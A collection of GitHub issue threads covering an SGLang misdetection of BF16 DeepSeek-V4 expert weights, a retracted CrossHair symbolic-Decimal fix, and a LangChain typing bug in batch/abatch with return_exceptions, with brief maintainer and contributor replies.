A DeepSeek-V4 checkpoint whose routed experts are stored in BF16 (for example, one exported from a training framework, with no `quantization_config` in `config.json`) is treated as an MXFP4-expert checkpoint. The first MoE forward pass then fails in the fused-MoE runner with:

```
ValueError: too many values to unpack (expected 3)
```

Setting `SGLANG_DSV4_FP4_EXPERTS=0` works around it.

Cause, from reading `main`:

1. `ModelConfig` (`configs/model_config.py`, DSV4 branch) defaults `is_fp4_experts` to `SGLANG_DSV4_FP4_EXPERTS` (default `True`) and only overrides it when `try_detect_fp4_experts` returns a bool.
2. `try_detect_fp4_experts` (`configs/deepseek_v4.py`) returns `True` for `U8/I8/F4`, `False` for `F8_E4M3`, and `None` for anything else, including `BF16`. A BF16 checkpoint therefore keeps `is_fp4_experts=True`.
3. `arg_groups/model_overrides/deepseek_v4.py` selects `moe_runner_backend="flashinfer_mxfp4"` on SM90/SM100/SM120 when the backend is `auto`.
4. The checkpoint has no quantization config, so `quant_config` is `None` and the `TopK` built in `models/deepseek_v2.py` gets `is_fp4_experts=False`. In `layers/moe/topk.py`, `is_flashinfer_mxfp4() and not self.is_fp4_experts` selects `TopKOutputFormat.BYPASSED`.
5. The unquantized MoE path unpacks the top-k output as `topk_weights, topk_ids, _ = topk_output` (e.g. `moe_runner/triton_utils/fused_moe.py`), but `BypassedTopKOutput` has five fields.

Possible fix: have `try_detect_fp4_experts` return `False` for unquantized dtypes (`BF16`, `F16`, `F32`), or force `is_fp4_experts=False` when the checkpoint has no quantization config.

### Reproduction

Any DeepSeek-V4 checkpoint whose routed-expert weights (`*.experts.<i>.w1.weight`, etc.) are BF16 and whose `config.json` has no `quantization_config`, launched with default MoE settings on SM90/SM100:

```
python -m sglang.launch_server --model-path /path/to/deepseek-v4-bf16 --tp 8
```

The first request fails as above. The same command with `SGLANG_DSV4_FP4_EXPERTS=0` serves correctly.

### Environment

Observed on 8x B300 with an SGLang build based on v0.5.21. The code path above is unchanged on current `main`.

comment.body: Thank you for the detailed report and root-cause analysis. I'd like to take this one — I'll open a PR with a fix shortly.

issue.title: Fix symbolic Decimal coefficient pinned to "0" (follow-up to #448)
issue.body:
Follow-up to #448 (and #460).

#460 fixed the coefficient digits being drawn from the wrong range (ASCII codepoints instead of digit values), which was the main cause of symbolic Decimals collapsing to zero. However, the coefficient still materializes as a concrete `"0"`: `_make_decimal` routes the digits through `Decimal`'s tuple constructor, whose digit loop (`for digit in value[1]`) cannot enumerate a symbolic-length tuple, so `digits` is always empty and `_int` becomes `"0"`.

This change builds the proxy directly (the same pattern `_dec_from_triple` uses) with a symbolic digit string constrained to the model's invariant (at least one digit, no leading zeros), and bounds a symbolic exponent to the default context's `[Emin, Emax]`.

Before: `crosshair check` on `post: a != Decimal("2")` reports "Not confirmed".
After: it finds a concrete counterexample (`f(Decimal('2.0'))`).

- `decimallib_test.py` + `decimallib_ch_test.py`: 13/13 pass (`PYTHONHASHSEED=0`).
- New regression test `test_symbolic_decimal_reaches_nonzero_coefficients` fails without the fix and passes with it.

comment.body:
Thanks for the detailed investigation — your analysis is correct. I rechecked the relevant paths, and SymbolicBoundedIntTuple.__iter__ does fork over the symbolic length, while converting each symbolic digit to str preserves a symbolic LazyIntSymbolicStr. That means my premise that the digit loop was empty and _int was pinned to "0" does not hold after #460.
I also agree that the added test does not distinguish this branch from current main, and bounding the exponent to the default context’s Emin/Emax would incorrectly narrow the set of constructible Decimals.
My locally available environment is Python 3.10.13 / Z3 4.15.4 with C_DECIMAL_IS_ACTIVE == False, so it is not directly comparable to your C-decimal setup; however, main and this branch behaved identically there as well. I don’t have a concrete contract where this branch outperforms main.
Thanks for catching this. I’ll close the PR rather than carry forward an unsupported fix.

issue.title: core: `batch`/`abatch` are typed `list[Output]` even with `return_exceptions=True`

labels.name: repo-ac7e25de
labels.description: Related to a bug, vulnerability, unexpected error with an existing feature

issue.body:
### Submission checklist

- [x] This is a bug, not a usage question.
- [x] I added a clear and descriptive title that summarizes this issue.
- [x] I used the GitHub search to find a similar question and didn't find it.
- [x] I am sure that this is a bug in LangChain rather than my code.
- [x] The bug is not resolved by updating to the latest stable version of LangChain (or the specific integration package).
- [x] This is not related to the langchain-community package.
- [x] I posted a self-contained, minimal, reproducible example. A maintainer can copy it and run it AS IS.

### Package (Required)

- [x] langchain-core

### Related Issues / PRs

- #17603 added `return_exceptions` overloads to `batch_as_completed`/`abatch_as_completed`, but not to `batch`/`abatch`.
- #35419: `abatch_as_completed`, the correctly typed alternative, doesn't cancel pending tasks on cancellation, so it isn't a drop-in replacement under a deadline.

### Reproduction Steps / Example Code (Python)

```python
import asyncio
from typing import reveal_type

from langchain_core.runnables import RunnableLambda


def double(x: int) -> int:
    if x < 0:
        raise ValueError("negative")
    return x * 2


runnable = RunnableLambda(double)


async def main() -> None:
    results = await runnable.abatch([1, -1], return_exceptions=True)
    reveal_type(results)  # list[int], though the list holds a ValueError
    print(results)
    print(sum(results))  # type-checks, then raises TypeError at runtime


asyncio.run(main())
```

### Error Message and Stack Trace (if applicable)

```
$ mypy repro.py
repro.py:18: note: Revealed type is "list[int]"
Success: no issues found in 1 source file

$ python repro.py
[2, ValueError('negative')]
TypeError: unsupported operand type(s) for +: 'int' and 'ValueError'
```

### Description

`Runnable.batch` and `Runnable.abatch` return `list[Output]` whatever `return_exceptions` is. With `return_exceptions=True`, both put the caught `Exception` in the result list instead of an output. The base `batch` even has to `cast("list[Output]", ...)` a list typed `Output | Exception` to match its annotation. Type checkers therefore treat every element as a success: `isinstance(item, Exception)` narrowing looks unreachable, and code like `sum(results)` passes type checking but fails at runtime.

The same signature is repeated by every override on `master` (`RunnableSequence`, `RunnableEach`/`RunnableBinding`, `RunnableWithFallbacks`, `RunnableRetry`, `RouterRunnable`, `DynamicRunnable`, `BaseLLM`, and the fake chat models). Internal callers such as `fallbacks.py` and `retry.py` already narrow results with `isinstance(output, BaseException)`.

Suggested fix: give `batch`/`abatch` the same overloads `batch_as_completed` already has, on the base class and its overrides:

```python
@overload
async def abatch(
    self,
    inputs: list[Input],
    config: RunnableConfig | list[RunnableConfig] | None = None,
    *,
    return_exceptions: Literal[False] = False,
    **kwargs: Any | None,
) -> list[Output]: ...

@overload
async def abatch(
    self,
    inputs: list[Input],
    config: RunnableConfig | list[RunnableConfig] | None = None,
    *,
    return_exceptions: Literal[True],
    **kwargs: Any | None,
) -> list[Output | Exception]: ...
```

### System Info

langchain-core 1.6.11 (the latest on PyPI; `master` at b7b942a7ff has the same signatures), Python 3.14.8, macOS arm64, mypy and ty.

🤖 Generated with [Claude Code](https://claude.com/claude-code) · Claude Opus 5.5 (claude-opus-5-5) · effort: high

comment.body:
Thanks for the detailed report — the type/runtime mismatch with `return_exceptions=True` is a real footgun (type-checks pass, then `sum(results)` blows up at runtime).

I'd like to work on this. The plan is to give `batch`/`abatch` the same `return_exceptions` overloads that `batch_as_completed`/`abatch_as_completed` already have (per #17603), on the base `Runnable` class and its overrides (`RunnableSequence`, `RunnableEach`/`RunnableBinding`, `RunnableWithFallbacks`, `RunnableRetry`, `RouterRunnable`, `DynamicRunnable`, `BaseLLM`, and the fake chat models).

Could you please assign this issue to me? Happy to start implementing once assigned.
